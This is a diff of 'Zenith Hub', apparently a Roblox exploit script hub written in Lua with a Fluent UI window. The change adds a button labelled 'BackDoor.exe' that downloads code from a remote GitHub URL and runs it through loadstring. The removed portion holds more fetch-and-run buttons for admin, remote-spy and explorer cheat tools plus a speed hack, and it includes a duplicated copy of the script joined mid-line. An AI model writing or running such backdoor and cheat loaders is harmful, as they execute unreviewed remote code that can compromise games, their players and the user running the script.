@@ -6,9 +6,9 @@ local Window = Fluent:CreateWindow({
     Title = "Zenith Hub" .. Fluent.Version,
     SubTitle = "",
     TabWidth = 160,
-    Size = UDim2.fromOffset(580, 410), -- Original size from the first script
+    Size = UDim2.fromOffset(580, 440), -- Original size from the first script
     Acrylic = true,
-    Theme = "Dark",
+    Theme = "Amethyst",
     MinimizeKey = Enum.KeyCode.LeftControl
 })
 
@@ -71,104 +71,17 @@ local Options = Fluent.Options do
         end
     end)
 
-    -- Restore Options.MyToggle from the first script
-    local MyToggle = Tabs.Main:AddToggle("MyToggle", { Title = "Toggle", Default = false })
-    MyToggle:OnChanged(function()
-        print("Toggle changed:", Options.MyToggle.Value)
-    end)
-    Options.MyToggle:SetValue(false)
+
+Tabs.Main:AddButton({
+        Title = "BackDoor.exe",
+        Description = "Load the backdoor script",
+        Callback = function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RealSilentx/Test4/refs/heads/main/Backdoor.exe"))()
+          end
+    })
+
+
 end
-
-SaveManager:SetLibrary(Fluent)
-InterfaceManager:SetLibrary(Fluent)
-SaveManager:IgnoreThemeSettings()
-SaveManager:SetIgnoreIndexes({})
-InterfaceManager:SetFolder("FluentScriptHub")
-SaveManager:SetFolder("FluentScriptHub/specific-game")
-
-InterfaceManager:BuildInterfaceSection(Tabs.Settings)
-SaveManager:BuildConfigSection(Tabs.Settings)
-
-Window:SelectTab(1)
-
-Fluent:Notify({
-    Title = "Script loaded",
-    Content = "The script has been loaded.",
-    Duration = 5
-})
-
-SaveManager:LoadAutoloadConfig()local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
-local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
-local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
-
-local Window = Fluent:CreateWindow({
-    Title = "Zenith Hub" .. Fluent.Version,
-    SubTitle = "",
-    TabWidth = 160,
-    Size = UDim2.fromOffset(580, 410), -- Original size from the first script
-    Acrylic = true,
-    Theme = "Dark",
-    MinimizeKey = Enum.KeyCode.LeftControl
-})
-
-local Tabs = {
-    Main = Window:AddTab({ Title = "Main", Icon = "" }),
-    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
-}
-
-local Options = Fluent.Options do
-    -- Button for Nameless Admin script
-    Tabs.Main:AddButton({
-        Title = "Nameless Admin",
-        Description = "Load the Nameless Admin script",
-        Callback = function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source"))()
-        end
-    })
-
-    -- Simply Spy button
-    Tabs.Main:AddButton({
-        Title = "Simply Spy",
-        Description = "Load the Simply Spy script",
-        Callback = function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/RealSilentx/SimplySpy/main/.lua"))()
-        end
-    })
-
-    -- DEX Explorer button
-    Tabs.Main:AddButton({
-        Title = "DEX Explorer",
-        Description = "Load the DEX Explorer script",
-        Callback = function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/DEX-Explorer/main/Mobile.lua"))()
-        end
-    })
-
-    -- Emote button
-    Tabs.Main:AddButton({
-        Title = "Emote",
-        Description = "Load the Emote script",
-        Callback = function()
-            loadstring(game:HttpGet("https://pastebin.com/raw/eCpipCTH"))()
-        end
-    })
-
-    -- Toggle button for player speed
-    local Toggle = Tabs.Main:AddToggle("PlayerSpeedToggle", { Title = "Speed Boost", Default = false })
-    
-    Toggle:OnChanged(function()
-        local player = game.Players.LocalPlayer
-        local character = player.Character or player.CharacterAdded:Wait()
-        local humanoid = character:FindFirstChildOfClass("Humanoid")
-
-        if Toggle.Value then
-            humanoid.WalkSpeed = 100  -- Set speed to 100 when toggled on
-            print("Speed boost enabled.")
-        else
-            humanoid.WalkSpeed = 16  -- Reset speed to default (16)
-            print("Speed boost disabled.")
-        end
-    end)
 
 SaveManager:SetLibrary(Fluent)
 InterfaceManager:SetLibrary(Fluent)
